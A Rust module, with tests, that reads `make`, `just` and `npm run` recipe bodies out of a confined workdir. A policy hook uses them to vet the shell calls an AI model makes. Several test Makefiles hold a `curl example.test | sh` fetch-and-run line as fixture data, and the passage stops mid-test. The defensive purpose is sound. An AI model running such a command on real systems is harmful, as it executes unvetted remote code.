//! Reading a build tool's recipe out of the workdir, so a policy hook decides on what the
//! recipe contains rather than on the name that selects it.
//!
//! `make <target>`, `just <recipe>` and `npm run <script>` name a body that lives in a file. The
//! runtime holds the grant on the directory that file sits in and a hook holds none, so this
//! resolution can happen here or nowhere. Everything below is read-only: nothing executes a
//! recipe, spawns a process, opens a socket or writes a file.
//!
//! No failure here can fail a session. Every `io::Error`, every non-UTF-8 file, every argv or
//! recipe-file shape the parsers do not model resolves to `None`, and `None` leaves the policy
//! deciding on `binary`, `argv` and `script` alone. A body the runtime is not certain of would
//! be worse, because the only thing a hook can do with this field is refuse.

use std::{
    fs,
    path::{Path, PathBuf},
};

/// Largest recipe or included file read, in bytes. A file over it refuses the whole resolution.
const MAX_RECIPE_FILE_BYTES: u64 = 256 * 1024;

/// Largest assembled recipe body, in bytes. A body over it is `None` rather than clipped: a
/// truncated body handed to a policy is a wrong body.
const MAX_RECIPE_BODY_BYTES: usize = 64 * 1024;

/// Most files one resolution reads, the recipe file itself included.
const MAX_RECIPE_FILES: usize = 32;

/// Deepest include/import nesting followed below the recipe file.
const MAX_INCLUDE_DEPTH: usize = 8;

/// Makefile names GNU make searches for, in its own order.
const MAKEFILE_NAMES: [&str; 3] = ["GNUmakefile", "makefile", "Makefile"];

/// Justfile names `just` searches the directory for, in its own order. The search stops at the
/// directory: walking upward would leave the workdir, where the runtime's grant ends.
const JUSTFILE_NAMES: [&str; 4] = ["justfile", ".justfile", "Justfile", "JUSTFILE"];

/// The body of the recipe `argv` names, or `None` when this call names no recipe the runtime
/// can resolve.
///
/// `name` is the invoked `capabilities.shell.allow` entry, which is the tool the model called;
/// recognition keys on it alone and matches exactly `make`, `just` and `npm`. Script text is
/// never parsed, so `bash -c "just build"` resolves to `None` — reading a build-tool invocation
/// out of a shell body would be guessing, and absence beats a guess.
///
/// `workdir` is the directory the subprocess will run in, and is the confinement boundary: every
/// file read resolves, after symlinks, to a path inside it or the resolution returns `None`.
pub(crate) fn resolve_recipe(workdir: &Path, name: &str, argv: &[String]) -> Option<String> {
    match name {
        "make" => resolve_make(workdir, argv),
        "just" => resolve_just(workdir, argv),
        "npm" => resolve_npm(workdir, argv),
        _ => None,
    }
}

/// Files one resolution may still read. Bounds an include chain that fans out rather than one
/// that nests, which [`MAX_INCLUDE_DEPTH`] alone would not catch.
struct FileBudget(usize);

impl FileBudget {
    fn new() -> Self {
        Self(MAX_RECIPE_FILES)
    }

    fn take(&mut self) -> Option<()> {
        self.0 = self.0.checked_sub(1)?;
        Some(())
    }
}

/// The real path of `candidate`, or `None` when nothing is there or it resolves outside `root`.
///
/// Both sides are canonicalized before the prefix test, so a symlink pointing out of the workdir
/// is refused by the same comparison that refuses a `../` component.
fn confine(root: &Path, candidate: &Path) -> Option<PathBuf> {
    let root = fs::canonicalize(root).ok()?;
    let real = fs::canonicalize(candidate).ok()?;
    real.starts_with(&root).then_some(real)
}

/// What one attempt at a file named by a recipe produced.
enum FileRead {
    Text(String),
    /// Nothing is at the path. `include` treats that as fatal, `-include` skips it.
    Missing,
    /// Present but unusable: outside the workdir, over a cap, or not UTF-8. Fatal whichever
    /// directive named it.
    Refused,
}

fn read_file(root: &Path, path: &Path, budget: &mut FileBudget) -> FileRead {
    if !path.exists() {
        return FileRead::Missing;
    }
    let Some(real) = confine(root, path) else {
        return FileRead::Refused;
    };
    let Ok(meta) = fs::metadata(&real) else {
        return FileRead::Refused;
    };
    if !meta.is_file() || meta.len() > MAX_RECIPE_FILE_BYTES || budget.take().is_none() {
        return FileRead::Refused;
    }
    match fs::read(&real).map(String::from_utf8) {
        Ok(Ok(text)) => FileRead::Text(text),
        Ok(Err(_)) | Err(_) => FileRead::Refused,
    }
}

/// The one directory a recipe file is looked for in: `workdir`, or the confined subdirectory the
/// invocation selected.
fn search_dir(workdir: &Path, selected: Option<&String>) -> Option<PathBuf> {
    match selected {
        Some(dir) => confine(workdir, &workdir.join(dir)),
        None => confine(workdir, workdir),
    }
}

fn within_body_cap(body: String) -> Option<String> {
    (body.len() <= MAX_RECIPE_BODY_BYTES).then_some(body)
}

// ── make ─────────────────────────────────────────────────────────────────────

/// The argv shape `make` is resolved for: an optional makefile, an optional directory, and
/// exactly one target.
struct MakeInvocation {
    makefile: Option<String>,
    directory: Option<String>,
    target: String,
}

/// Accepts `-f <file>`, `--file=<file>`, `--makefile=<file>`, `-C <dir>` and `--directory=<dir>`
/// followed by exactly one target. Any other flag, a second target, or a word carrying `=` — a
/// variable override, which changes what the recipe expands to — is `None`.
fn parse_make_argv(argv: &[String]) -> Option<MakeInvocation> {
    let mut makefile: Option<String> = None;
    let mut directory: Option<String> = None;
    let mut target: Option<String> = None;
    let mut words = argv.iter();
    while let Some(word) = words.next() {
        let taken = if let Some(file) = word
            .strip_prefix("--file=")
            .or_else(|| word.strip_prefix("--makefile="))
        {
            makefile.replace(file.to_string())
        } else if let Some(dir) = word.strip_prefix("--directory=") {
            directory.replace(dir.to_string())
        } else if word == "-f" {
            makefile.replace(words.next()?.to_string())
        } else if word == "-C" {
            directory.replace(words.next()?.to_string())
        } else if word.starts_with('-') || word.contains('=') {
            return None;
        } else {
            target.replace(word.to_string())
        };
        if taken.is_some() {
            return None;
        }
    }
    Some(MakeInvocation {
        makefile,
        directory,
        target: target?,
    })
}

/// The recipe lines of an explicit `make` rule, each with its leading recipe-prefix tab removed.
///
/// Nothing is expanded: `$(VAR)`, `${VAR}` and `$$` are carried as written, pattern and suffix
/// rules are not matched against, `ifeq` and every other conditional is read as ordinary text,
/// `.PHONY` and the other special targets are treated as the plain target names they are, and
/// `$(MAKE)` recursion is not followed. A target reachable only through a pattern rule is `None`.
fn resolve_make(workdir: &Path, argv: &[String]) -> Option<String> {
    let invocation = parse_make_argv(argv)?;
    let dir = search_dir(workdir, invocation.directory.as_ref())?;
    let path = match invocation.makefile {
        Some(ref file) => dir.join(file),
        None => MAKEFILE_NAMES
            .iter()
            .map(|name| dir.join(name))
            .find(|candidate| candidate.is_file())?,
    };

    let mut budget = FileBudget::new();
    let mut lines = Vec::new();
    read_makefile(workdir, &path, 0, &mut budget, &mut lines)?;
    make_recipe_body(&lines, &invocation.target)
}

/// Append `path`'s lines to `out`, splicing every `include`d file in at the point its directive
/// appears, so the assembled stream is the one make itself would read.
fn read_makefile(
    workdir: &Path,
    path: &Path,
    depth: usize,
    budget: &mut FileBudget,
    out: &mut Vec<String>,
) -> Option<()> {
    let FileRead::Text(text) = read_file(workdir, path, budget) else {
        return None;
    };
    let dir = path.parent()?.to_path_buf();
    for line in text.lines() {
        let Some((optional, named)) = make_include(line) else {
            out.push(line.to_string());
            continue;
        };
        if depth >= MAX_INCLUDE_DEPTH {
            return None;
        }
        for name in named {
            // A path that would have to be expanded or globbed names a file this parser cannot
            // identify, so it names no file at all.
            if name.contains(['$', '*', '?', '[']) {
                return None;
            }
            let included = dir.join(name);
            if !included.exists() {
                if optional {
                    continue;
                }
                return None;
            }
            read_makefile(workdir, &included, depth + 1, budget, out)?;
        }
    }
    Some(())
}

/// The files an `include` directive names, and whether a missing one is skipped. `-include` and
/// `sinclude` skip; `include` is fatal — that is make's own semantics.
fn make_include(line: &str) -> Option<(bool, Vec<&str>)> {
    if line.starts_with('\t') {
        return None;
    }
    let trimmed = line.trim_start_matches(' ');
    let (optional, rest) = if let Some(rest) = trimmed.strip_prefix("include ") {
        (false, rest)
    } else if let Some(rest) = trimmed.strip_prefix("-include ") {
        (true, rest)
    } else {
        (true, trimmed.strip_prefix("sinclude ")?)
    };
    Some((optional, rest.split_whitespace().collect()))
}

fn make_recipe_body(lines: &[String], target: &str) -> Option<String> {
    let mut found: Option<String> = None;
    let mut index = 0;
    while index < lines.len() {
        let line = &lines[index];
        index += 1;
        let Some((targets, semicolon_recipe)) = make_rule_targets(line) else {
            continue;
        };
        if line.trim_end().ends_with('\\') {
            // A continued rule line carries target names on a line this parser does not join up.
            return None;
        }
        let mut recipe: Vec<&str> = Vec::new();
        while let Some(stripped) = lines.get(index).and_then(|next| next.strip_prefix('\t')) {
            index += 1;
            recipe.push(stripped);
            if stripped.trim_end().ends_with('\\')
                && !lines.get(index).is_some_and(|next| next.starts_with('\t'))
            {
                // The continuation leaves the recipe, so the lines collected are not the body.
                return None;
            }
        }
        if !targets.contains(&target) {
            continue;
        }
        if semicolon_recipe {
            // `target: ; cmd` puts a recipe line on the rule line itself, where the tab-prefixed
            // run collected above does not carry it. Reporting the tab lines alone would show a
            // policy a body other than the one that runs.
            return None;
        }
        if found.is_some() {
            // Two explicit rules for one target: make picks one, and this parser does not model
            // which.
            return None;
        }
        found = Some(recipe.join("\n"));
    }
    within_body_cap(found?)
}

/// The target names an explicit rule line declares and whether it carries a `;` recipe, or `None`
/// for a comment, a blank, a variable assignment, a directive, or a pattern rule.
fn make_rule_targets(line: &str) -> Option<(Vec<&str>, bool)> {
    if line.starts_with('\t') {
        return None;
    }
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return None;
    }
    let colon = trimmed.find(':')?;
    let (head, rest) = trimmed.split_at(colon);
    if head.contains('=') || rest.starts_with(":=") || rest.starts_with("::=") {
        return None;
    }
    let targets: Vec<&str> = head.split_whitespace().collect();
    if targets.is_empty()
        || targets
            .iter()
            .any(|name| name.contains('%') || name.contains('$'))
    {
        return None;
    }
    Some((targets, rest.contains(';')))
}

// ── just ─────────────────────────────────────────────────────────────────────

/// The argv shape `just` is resolved for: an optional justfile, an optional working directory,
/// and exactly one recipe name.
struct JustInvocation {
    justfile: Option<String>,
    directory: Option<String>,
    recipe: String,
}

/// Accepts `-f <path>` / `--justfile <path>` and `-d <dir>` / `--working-directory <dir>`
/// followed by exactly one recipe name. Any other flag, a second word, or a name carrying `::` —
/// a module recipe, defined in a file this parser does not follow — is `None`.
fn parse_just_argv(argv: &[String]) -> Option<JustInvocation> {
    let mut justfile: Option<String> = None;
    let mut directory: Option<String> = None;
    let mut recipe: Option<String> = None;
    let mut words = argv.iter();
    while let Some(word) = words.next() {
        let taken = match word.as_str() {
            "-f" | "--justfile" => justfile.replace(words.next()?.to_string()),
            "-d" | "--working-directory" => directory.replace(words.next()?.to_string()),
            other if other.starts_with('-') || other.contains("::") => return None,
            other => recipe.replace(other.to_string()),
        };
        if taken.is_some() {
            return None;
        }
    }
    Some(JustInvocation {
        justfile,
        directory,
        recipe: recipe?,
    })
}

/// A `just` recipe's indented body, with the indentation common to its lines removed.
///
/// Nothing is expanded: `{{ … }}` interpolations, `$VAR`, recipe parameters and their defaults,
/// `set` settings and `mod` submodules are carried as written or ignored. `alias b := build` is
/// not followed, so an aliased name resolves to `None` like any other undefined recipe.
fn resolve_just(workdir: &Path, argv: &[String]) -> Option<String> {
    let invocation = parse_just_argv(argv)?;
    let dir = search_dir(workdir, invocation.directory.as_ref())?;
    let path = match invocation.justfile {
        Some(ref file) => dir.join(file),
        None => JUSTFILE_NAMES
            .iter()
            .map(|name| dir.join(name))
            .find(|candidate| candidate.is_file())?,
    };

    let mut budget = FileBudget::new();
    let mut lines = Vec::new();
    read_justfile(workdir, &path, 0, &mut budget, &mut lines)?;
    just_recipe_body(&lines, &invocation.recipe)
}

/// Append `path`'s lines to `out`, splicing every `import`ed file in at the point its directive
/// appears.
fn read_justfile(
    workdir: &Path,
    path: &Path,
    depth: usize,
    budget: &mut FileBudget,
    out: &mut Vec<String>,
) -> Option<()> {
    let FileRead::Text(text) = read_file(workdir, path, budget) else {
        return None;
    };
    let dir = path.parent()?.to_path_buf();
    for line in text.lines() {
        let Some((optional, name)) = just_import(line) else {
            out.push(line.to_string());
            continue;
        };
        if depth >= MAX_INCLUDE_DEPTH {
            return None;
        }
        let imported = dir.join(name);
        if !imported.exists() {
            if optional {
                continue;
            }
            return None;
        }
        read_justfile(workdir, &imported, depth + 1, budget, out)?;
    }
    Some(())
}

/// The file an `import` directive names, and whether a missing one is skipped. `import?` skips;
/// `import` is fatal — that is just's own semantics.
fn just_import(line: &str) -> Option<(bool, &str)> {
    let trimmed = line.trim();
    let (optional, rest) = if let Some(rest) = trimmed.strip_prefix("import?") {
        (true, rest)
    } else {
        (false, trimmed.strip_prefix("import")?)
    };
    let rest = rest.trim();
    let path = rest
        .strip_prefix('\'')
        .and_then(|inner| inner.strip_suffix('\''))
        .or_else(|| {
            rest.strip_prefix('"')
                .and_then(|inner| inner.strip_suffix('"'))
        })?;
    Some((optional, path))
}

fn just_recipe_body(lines: &[String], recipe: &str) -> Option<String> {
    let mut found: Option<String> = None;
    let mut index = 0;
    while index < lines.len() {
        let header = &lines[index];
        index += 1;
        let Some(name) = just_recipe_name(header) else {
            continue;
        };
        let mut body: Vec<&str> = Vec::new();
        let mut blanks = 0;
        while let Some(next) = lines.get(index) {
            if next.trim().is_empty() {
                blanks += 1;
                index += 1;
                continue;
            }
            if !next.starts_with([' ', '\t']) {
                break;
            }
            // Blank lines inside a body belong to it; the run trailing the last indented line
            // does not, and is dropped by never being flushed.
            body.resize(body.len() + blanks, "");
            blanks = 0;
            body.push(next);
            index += 1;
        }
        if name != recipe {
            continue;
        }
        if found.is_some() {
            // `just` refuses a duplicate recipe outright, so there is no body to report.
            return None;
        }
        found = Some(dedent(&body));
    }
    within_body_cap(found?)
}

/// The recipe a header line declares, or `None` for an attribute, an assignment, an alias, a
/// setting, a comment, or an indented line.
fn just_recipe_name(line: &str) -> Option<&str> {
    if line.starts_with([' ', '\t']) {
        return None;
    }
    let trimmed = line.trim_end();
    if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with('[') {
        return None;
    }
    if trimmed.ends_with('\\') {
        // A continued header carries dependencies this parser does not join up, which leaves the
        // recipe undefined as far as it is concerned.
        return None;
    }
    let colon = trimmed.find(':')?;
    if trimmed[colon..].starts_with(":=") {
        return None;
    }
    // `@` before the name suppresses echoing of every line and is not part of the name.
    let name = trimmed[..colon].split_whitespace().next()?;
    let name = name.strip_prefix('@').unwrap_or(name);
    (!name.is_empty()).then_some(name)
}

/// Strip the indentation common to every non-blank line, which is the recipe's own left margin.
fn dedent(lines: &[&str]) -> String {
    let common = lines
        .iter()
        .filter(|line| !line.trim().is_empty())
        .map(|line| line.len() - line.trim_start_matches([' ', '\t']).len())
        .min()
        .unwrap_or(0);
    lines
        .iter()
        .map(|line| {
            if line.trim().is_empty() {
                ""
            } else {
                &line[common..]
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

// ── npm run ──────────────────────────────────────────────────────────────────

/// The string `scripts.<script>` holds in `package.json`.
///
/// The argv must be exactly `["run", <script>]` or `["run-script", <script>]`. Any flag,
/// `-w`/`--workspace`, `--prefix`, trailing `--` arguments and a bare `npm run` are all `None`.
///
/// A `pre<script>` or `post<script>` sibling is `None` as well: npm runs those around the named
/// script, so no single body describes what will run, and the middle one alone would read as
/// complete.
///
/// Nothing is expanded: `npm_*` environment variables, `$npm_…` references, `config`
/// substitutions and workspace fan-out are carried as written or not modelled at all.
fn resolve_npm(workdir: &Path, argv: &[String]) -> Option<String> {
    let [subcommand, script] = argv else {
        return None;
    };
    if subcommand != "run" && subcommand != "run-script" {
        return None;
    }
    if script.starts_with('-') {
        return None;
    }

    let mut budget = FileBudget::new();
    let FileRead::Text(text) = read_file(workdir, &workdir.join("package.json"), &mut budget)
    else {
        return None;
    };
    let package: serde_json::Value = serde_json::from_str(&text).ok()?;
    let scripts = package.get("scripts")?.as_object()?;
    if scripts.contains_key(&format!("pre{script}"))
        || scripts.contains_key(&format!("post{script}"))
    {
        return None;
    }
    within_body_cap(scripts.get(script.as_str())?.as_str()?.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn argv(words: &[&str]) -> Vec<String> {
        words.iter().map(|w| w.to_string()).collect()
    }

    fn write(dir: &Path, name: &str, contents: &str) {
        if let Some(parent) = Path::new(name).parent() {
            fs::create_dir_all(dir.join(parent)).unwrap();
        }
        fs::write(dir.join(name), contents).unwrap();
    }

    // ── just ─────────────────────────────────────────────────────────────────

    /// The body a justfile gives a recipe, with its own indentation removed.
    #[test]
    fn just_resolves_a_recipe_body() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "justfile",
            "build:\n    echo one\n    echo two\n\ntest:\n    echo other\n",
        );

        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
            Some("echo one\necho two".to_string())
        );
    }

    /// Every justfile name just searches for is searched, in just's own order.
    #[test]
    fn just_searches_its_own_file_names_in_order() {
        for name in JUSTFILE_NAMES {
            let tmp = TempDir::new().unwrap();
            write(tmp.path(), name, "build:\n  echo from-file\n");
            assert_eq!(
                resolve_recipe(tmp.path(), "just", &argv(&["build"])),
                Some("echo from-file".to_string()),
                "{name} is one of the names just looks for"
            );
        }
    }

    /// `{{ … }}` interpolations and `$VAR` are the file's own text and are carried as written.
    #[test]
    fn just_does_not_expand_interpolations_or_variables() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "justfile",
            "target := \"prod\"\n\ndeploy:\n  ship {{target}} $HOME\n",
        );

        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["deploy"])),
            Some("ship {{target}} $HOME".to_string())
        );
    }

    /// An `import` splices the imported file in; `import?` skips a missing one and `import`
    /// does not.
    #[test]
    fn just_follows_imports_and_distinguishes_the_optional_form() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "shared.just", "build:\n  echo shared\n");
        write(tmp.path(), "justfile", "import 'shared.just'\n");
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
            Some("echo shared".to_string())
        );

        write(
            tmp.path(),
            "justfile",
            "import? 'absent.just'\nbuild:\n  echo local\n",
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
            Some("echo local".to_string())
        );

        write(
            tmp.path(),
            "justfile",
            "import 'absent.just'\nbuild:\n  echo local\n",
        );
        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
    }

    /// An alias is a name the runtime does not follow to the recipe behind it.
    #[test]
    fn just_does_not_follow_an_alias() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "justfile",
            "alias b := build\n\nbuild:\n  echo one\n",
        );

        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["b"])), None);
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
            Some("echo one".to_string())
        );
    }

    /// A justfile that defines no such recipe, a module recipe, a second word and an unmodelled
    /// flag are all absence rather than a body.
    #[test]
    fn just_declines_what_it_does_not_model() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "justfile", "build:\n  echo one\n");

        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["absent"])), None);
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["mod::build"])),
            None
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["build", "extra"])),
            None
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["--dry-run", "build"])),
            None
        );
        assert_eq!(resolve_recipe(tmp.path(), "just", &[]), None);
    }

    /// `-f` and `-d` select the file and the directory, and both stay inside the workdir.
    #[test]
    fn just_honors_the_file_and_directory_flags_within_the_workdir() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "sub/justfile", "build:\n  echo nested\n");
        write(tmp.path(), "other.just", "build:\n  echo named\n");

        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["-d", "sub", "build"])),
            Some("echo nested".to_string())
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["-f", "other.just", "build"])),
            Some("echo named".to_string())
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "just", &argv(&["-d", "..", "build"])),
            None
        );
    }

    /// A justfile that is not UTF-8 is absence, not an error.
    #[test]
    fn a_justfile_that_is_not_utf8_resolves_to_nothing() {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join("justfile"), [0x62, 0x75, 0xff, 0x3a, 0x0a]).unwrap();

        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
    }

    /// A body over [`MAX_RECIPE_BODY_BYTES`] is absent rather than clipped.
    #[test]
    fn a_body_over_the_size_cap_resolves_to_nothing() {
        let tmp = TempDir::new().unwrap();
        let line = format!("  {}\n", "x".repeat(1000));
        write(
            tmp.path(),
            "justfile",
            &format!("build:\n{}", line.repeat(MAX_RECIPE_BODY_BYTES / 1000 + 2)),
        );

        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
    }

    /// An import chain deeper than [`MAX_INCLUDE_DEPTH`] is absence rather than a partial read.
    #[test]
    fn an_import_chain_over_the_depth_cap_resolves_to_nothing() {
        let tmp = TempDir::new().unwrap();
        let depth = MAX_INCLUDE_DEPTH + 2;
        write(tmp.path(), "justfile", "import 'link1.just'\n");
        for step in 1..depth {
            write(
                tmp.path(),
                &format!("link{step}.just"),
                &format!("import 'link{}.just'\n", step + 1),
            );
        }
        write(
            tmp.path(),
            &format!("link{depth}.just"),
            "build:\n  echo deep\n",
        );

        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
    }

    // ── make ─────────────────────────────────────────────────────────────────

    /// The recipe lines of an explicit rule, each with its recipe-prefix tab removed.
    #[test]
    fn make_resolves_a_target_recipe() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "Makefile",
            ".PHONY: deploy\n\ndeploy: build\n\techo $(REGISTRY)\n\techo two\n\nbuild:\n\techo other\n",
        );

        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["deploy"])),
            Some("echo $(REGISTRY)\necho two".to_string())
        );
    }

    /// `GNUmakefile` wins over `makefile`, which wins over `Makefile`.
    #[test]
    fn make_searches_its_own_file_names_in_order() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "Makefile", "build:\n\techo last\n");
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
            Some("echo last".to_string())
        );

        write(tmp.path(), "makefile", "build:\n\techo middle\n");
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
            Some("echo middle".to_string())
        );

        write(tmp.path(), "GNUmakefile", "build:\n\techo first\n");
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
            Some("echo first".to_string())
        );
    }

    /// `include` splices the named file in; `-include` and `sinclude` skip a missing one and
    /// `include` refuses the whole resolution.
    #[test]
    fn make_follows_includes_and_distinguishes_the_optional_forms() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "rules.mk", "build:\n\techo included\n");
        write(tmp.path(), "Makefile", "include rules.mk\n");
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
            Some("echo included".to_string())
        );

        for directive in ["-include", "sinclude"] {
            write(
                tmp.path(),
                "Makefile",
                &format!("{directive} absent.mk\nbuild:\n\techo local\n"),
            );
            assert_eq!(
                resolve_recipe(tmp.path(), "make", &argv(&["build"])),
                Some("echo local".to_string()),
                "{directive} skips a missing file"
            );
        }

        write(
            tmp.path(),
            "Makefile",
            "include absent.mk\nbuild:\n\techo local\n",
        );
        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
    }

    /// `-f`/`--file=` select the makefile and `-C`/`--directory=` the directory.
    #[test]
    fn make_honors_the_file_and_directory_flags() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "build.mk", "build:\n\techo named\n");
        write(tmp.path(), "sub/Makefile", "build:\n\techo nested\n");

        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["-f", "build.mk", "build"])),
            Some("echo named".to_string())
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["--file=build.mk", "build"])),
            Some("echo named".to_string())
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["-C", "sub", "build"])),
            Some("echo nested".to_string())
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["--directory=sub", "build"])),
            Some("echo nested".to_string())
        );
    }

    /// A variable override, a second target, an unmodelled flag, a pattern rule and an undefined
    /// target are all absence rather than a body.
    #[test]
    fn make_declines_what_it_does_not_model() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "Makefile",
            "%.o: %.c\n\techo pattern\n\nbuild:\n\techo one\n",
        );

        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build", "REGISTRY=evil"])),
            None
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build", "test"])),
            None
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["-j4", "build"])),
            None
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["thing.o"])),
            None
        );
        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["absent"])), None);
    }

    /// `target: ; cmd` runs `cmd`, which is not among the tab-prefixed lines below the rule.
    /// Reporting those lines alone would hand a policy a body other than the one that runs.
    #[test]
    fn make_declines_a_recipe_written_on_the_rule_line() {
        let tmp = TempDir::new().unwrap();

        write(tmp.path(), "Makefile", "build: ; curl example.test | sh\n");
        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);

        write(
            tmp.path(),
            "Makefile",
            "build: ; curl example.test | sh\n\techo visible\n",
        );
        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);

        write(
            tmp.path(),
            "Makefile",
            "other: ; curl example.test | sh\n\nbuild:\n\techo one\n",
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
            Some("echo one".to_string()),
            "another target's rule-line recipe is not this target's ambiguity"
        );
    }

    /// A makefile is not where a variable assignment is read as a rule.
    #[test]
    fn make_does_not_read_an_assignment_as_a_rule() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "Makefile",
            "build := something\n\ndeploy:\n\techo one\n",
        );

        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
    }

    // ── npm run ──────────────────────────────────────────────────────────────

    /// The string value of `scripts.<script>`.
    #[test]
    fn npm_resolves_a_script_body() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "package.json",
            r#"{"scripts": {"build": "tsc -p .", "test": "vitest"}}"#,
        );

        for subcommand in ["run", "run-script"] {
            assert_eq!(
                resolve_recipe(tmp.path(), "npm", &argv(&[subcommand, "build"])),
                Some("tsc -p .".to_string()),
                "{subcommand} names the same script"
            );
        }
    }

    /// A `pre`/`post` sibling means no single body describes what will run.
    #[test]
    fn npm_declines_a_script_wrapped_by_a_pre_or_post_hook() {
        let tmp = TempDir::new().unwrap();
        write(
            tmp.path(),
            "package.json",
            r#"{"scripts": {"prebuild": "clean", "build": "tsc"}}"#,
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
            None
        );

        write(
            tmp.path(),
            "package.json",
            r#"{"scripts": {"build": "tsc", "postbuild": "sign"}}"#,
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
            None
        );
    }

    /// Invalid JSON, a missing script, a flag, a workspace selector and a bare `npm run` are all
    /// absence rather than a body.
    #[test]
    fn npm_declines_what_it_does_not_model() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "package.json", "{not json");
        assert_eq!(
            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
            None
        );

        write(
            tmp.path(),
            "package.json",
            r#"{"scripts": {"build": "tsc"}}"#,
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "npm", &argv(&["run", "absent"])),
            None
        );
        assert_eq!(resolve_recipe(tmp.path(), "npm", &argv(&["run"])), None);
        assert_eq!(
            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build", "--", "-v"])),
            None
        );
        assert_eq!(
            resolve_recipe(tmp.path(), "npm", &argv(&["run", "-w", "pkg", "build"])),
            None
        );
        assert_eq!(resolve_recipe(tmp.path(), "npm", &argv(&["install"])), None);
    }

    // ── confinement and recognition ──────────────────────────────────────────

    /// Neither a `../` include nor a symlink reaches a file outside the workdir: both resolve to
    /// nothing rather than being read.
    #[test]
    fn nothing_outside_the_workdir_is_read() {
        let outer = TempDir::new().unwrap();
        let workdir = outer.path().join("work");
        fs::create_dir(&workdir).unwrap();
        fs::write(outer.path().join("secret.mk"), "build:\n\techo secret\n").unwrap();

        write(
            &workdir,
            "Makefile",
            "include ../secret.mk\nbuild:\n\techo local\n",
        );
        assert_eq!(resolve_recipe(&workdir, "make", &argv(&["build"])), None);

        fs::write(outer.path().join("secret.just"), "build:\n  echo secret\n").unwrap();
        std::os::unix::fs::symlink(outer.path().join("secret.just"), workdir.join("justfile"))
            .unwrap();
        assert_eq!(resolve_recipe(&workdir, "just", &argv(&["build"])), None);
    }

    /// Recognition keys on the invoked name alone. A tool with no parser, and a shell
    /// interpreter carrying a build-tool invocation in its script text, both resolve to nothing.
    #[test]
    fn only_the_three_recognized_tool_names_resolve() {
        let tmp = TempDir::new().unwrap();
        write(tmp.path(), "justfile", "build:\n  echo one\n");

        assert_eq!(
            resolve_recipe(tmp.path(), "bash", &argv(&["-c", "just build"])),
            None
        );
        assert_eq!(resolve_recipe(tmp.path(), "cargo", &argv(&["build"])), None);
        assert_eq!(resolve_recipe(tmp.path(), "gmake", &argv(&["build"])), None);
    }

    /// A workdir with no recipe file at all is absence, and no panic.
    #[test]
    fn an_empty_workdir_resolves_to_nothing() {
        let tmp = TempDir::new().unwrap();

        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
        assert_eq!(
